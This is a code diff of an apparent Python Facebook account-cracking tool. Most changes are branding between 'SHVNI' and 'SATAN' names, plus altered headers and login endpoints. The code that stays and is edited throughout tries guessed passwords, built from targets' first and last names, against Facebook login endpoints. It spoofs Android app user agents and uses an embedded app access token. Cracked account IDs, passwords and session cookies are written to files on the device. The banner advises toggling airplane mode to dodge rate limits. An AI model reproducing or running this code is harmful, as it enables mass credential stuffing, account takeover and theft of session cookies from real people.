@@ -1,4 +1,4 @@
-#SC OWNER_______________SHVNI
+#SC OWNER_______________SATAN
 
 from ast import Pass
 from os import name, path
@@ -277,7 +277,7 @@ def S1():
 	kt = random.choice(['com.facebook.katana','com.facebook.orca','com.facebook.mlite'])
 	fbcr = random.choice(['o2 - de', 'Verizon - us','MY CELCOM','Vodafone - uk','null','DTAC','IND airtel','Nepal Telecom'])
 	s= "[FBAN/FB4A;FBAV/"+str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(111,999)) +";FBBV/"+str(random.randint(111111111,999999999))
-	e = "; [FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027763;FBDM/{density=2.625,width=1080,height=2094};FBLC/"+en+";FBRV/209644275;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/"+kt+";FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
+	e = ";[FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027763;FBDM/{density=2.625,width=1080,height=2094};FBLC/"+en+";FBRV/209644275;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/"+kt+";FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
 	ua = s + e	
 	return ua
 
@@ -318,22 +318,20 @@ for agent in range(10000):
 def clear():
 	os.system('clear')
 	print(logo)
-logo=("""\033[1;37m 
-\033[1;37m_______                    _       _________
-\033[1;37m(  ____ \|\     /||\     /|( (    /|\__   __/
-\033[1;37m| (    \/| )   ( || )   ( ||  \  ( |   ) (   
-\033[1;37m| (_____ | (___) || |   | ||   \ | |   | |   
-\033[1;37m(_____  )|  ___  |( (   ) )| (\ \) |   | |   
-\033[1;37m      ) || (   ) | \ \_/ / | | \   |   | |   
-\033[1;37m/\____) || )   ( |  \   /  | )  \  |___) (___
-\033[1;37m\_______)|/     \|   \_/   |/    )_)\_______/                                                     
+logo=("""\033[1;37m
+░██████╗██╗░░██╗██╗░░░██╗███╗░░██╗██╗
+██╔════╝██║░░██║██║░░░██║████╗░██║██║
+╚█████╗░███████║╚██╗░██╔╝██╔██╗██║██║
+░╚═══██╗██╔══██║░╚████╔╝░██║╚████║██║
+██████╔╝██║░░██║░░╚██╔╝░░██║░╚███║██║
+╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚══╝╚═╝
 \033[1;37m-----------------------------------------------
-\033[1;37m AUTHOR    : SHVNI\033[92;1m•
-\033[1;37m GITHUB    : SHVNI-404\033[92;1m
-\033[1;37m VERSION   : \033[92;1m5\033[92;1m.\033[92;1m1
+\033[1;37m FACEBOOK    :  SHVNI ZUCCHINI\033[92;1m•
+\033[1;37m GITHUB    : NOT FOUND
+\033[1;37m VERSION   : \033[92;1m6\033[92;1m.\033[92;1m0
 \033[1;37m═══════════════════════════════════════════════
-\033[92;1m  HI SW WELCOME MY TOOLS
-\033[92;1m  FACEBOOK CRACKING TOOLS
+\033[92;1m            USE FRESH/NEW FILE FOR OK IDS
+\033[92;1m            USE AIRPLANE MODE EVERY 3MINUTES\033[1;37m√ 
 \033[1;37m═══════════════════════════════════════════════""")   
 
 def line():
@@ -376,12 +374,12 @@ def asha(uid):
     else:alif=''
     return alif
 #_________[ LOGIN KEY ]______>>
-CorrectUsername = 'PAUL'
+CorrectUsername = 'SHVNI'
 key = 'true'
 while key == 'true':
     username = input('\033[0;97m[•]\033[1;96m•────➤\033[1;92mENTER KEY \033[1;91m: \x1b[1;92m')
     if username == CorrectUsername:
-            print(f'\033[1;37m-----------------------------------------------\n\033[0;97m[•]\033[1;32m LOGGED IN SATAN TOOL SUCCESSFULLY') 
+            print(f'\033[1;37m-----------------------------------------------\n\033[0;97m[•]\033[1;32m LOGGED IN SHVNI TOOLS') 
             time.sleep(1)
             clear()
             key = 'false'
@@ -443,7 +441,7 @@ def menu():
                                         total_ids = str(len(fo))
                                         
                                         print(' TOTAL ACCOUNT : \033[1;32m'+total_ids+f' ')
-                                        print("\033[1;37m CRACKING PLEASE WAIT\033[1;37m")
+                                        print("\033[1;37m STARTING PLEASE CAREFULLY\033[1;37m")
                                         line()
                                         for user in fo:
                                                 ids,names = user.split('|')
@@ -598,7 +596,7 @@ def ind():
                         tl = str(len(user))
                         print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mTOTAL ACCOUNT: \033[1;97m'+tl)
                         print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mSELECT CODE: \033[1;97m '+code)
-                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mCRACKING....ON \033[1;97m')
+                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mSTART CRACKING\033[1;97m')
                         line()
                         for psx in user:
                                 ids = code+psx
@@ -671,7 +669,7 @@ def gmail():
 
 def ffb(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSATAN\x1b[1;92m-\x1b[1;92mM3\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSHVNI\x1b[1;92m-\x1b[1;92mM3\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(' ')[0]
@@ -684,7 +682,7 @@ def ffb(ids,names,passlist):
                 for fikr in passlist:
                         pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                         ua=random.choice(S1())
-                        header_freefb = {'authority': 'mbasic.facebook.com',
+                        headers = {'authority': 'mbasic.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
@@ -711,7 +709,7 @@ def ffb(ids,names,passlist):
                                 coki=session.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print('\r\r\033[1;32m [SHVNI-OK] %s | %s'%(ids,pas))
-                                open('/sdcard/SHVNI-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/SHVNI-OK-COOKiE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
+                                open('/sdcard/SHVNI-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/SATAN-OK-COOKiE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                               
                                 oks.append(ids)
                                 break
@@ -739,27 +737,9 @@ def api1(ids,names,passlist):
 			ln = fn
 		for pw in passlist:
 			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-			header_freefb = {'authority': 'mbasic.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-model': '""',
-    'sec-ch-ua-platform': '"Linux"',
-    'sec-ch-ua-platform-version': '""',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
-    'viewport-width': '980',
-}
+			head = {'User-Agent':S1(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
 			data =  {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_GB','client_country_code':'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':' 350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
-			po = requests.post('https://mbasic.facebook.com/auth/login',data=data,headers=head).json()
+			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
 			if 'session_key' in po:
 				uid = str(po['uid'])
 				print('\r\r\033[1;32m [SHVNI-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
@@ -787,28 +767,10 @@ def rd(ids,passlist):
 	try:
 		global oks,loop
                 
-		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSATAN\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()		
+		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSHVNI\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()		
 		for pas in passlist:                                          
 			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'			
-header_freefb = {'authority': 'mbasic.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-model': '""',
-    'sec-ch-ua-platform': '"Linux"',
-    'sec-ch-ua-platform-version': '""',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
-    'viewport-width': '980',
-}
+			head = {'User-Agent':S1(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
 			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_GB','client_country_code':'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
 			po = requests.post('https://mbasic.facebook.com/auth/login',data=data,headers=head).json()
 			if 'session_key' in po:
@@ -855,23 +817,23 @@ def bd1(ids,passlist):
             "email":ids,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'mbasic.facebook.com',
+            headers = {'authority': 'mbasic.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
     'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
     'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"vivo Y83"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"8.1.0"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-model': '""',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-ch-ua-platform-version': '""',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
     'viewport-width': '980',
 }
             twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
@@ -915,7 +877,7 @@ def newidx(ids,names,passlist):
 			ln = fn
 		for pw in passlist:
 			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-			header_freefb = {'authority': 'mbasic.facebook.com',
+			headers = {'authority': 'mbasic.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
@@ -948,7 +910,7 @@ def newidx(ids,names,passlist):
 				break
 			elif 'www.facebook.com' in po['error']['message']:
 				uid = str(po['error']['error_data']['uid'])
-				#print(f'\r\r\033[1;33m [SHVNI-CP] '+uid+' | '+pas+'\033[1;97m')
+				#print(f'\r\r\033[1;33m [SVNI-CP] '+uid+' | '+pas+'\033[1;97m')
 				open('/sdcard/SHVNI-CP.txt','a').write(uid+'|'+pas+'\n')
 				cps.append(uid)
 				break
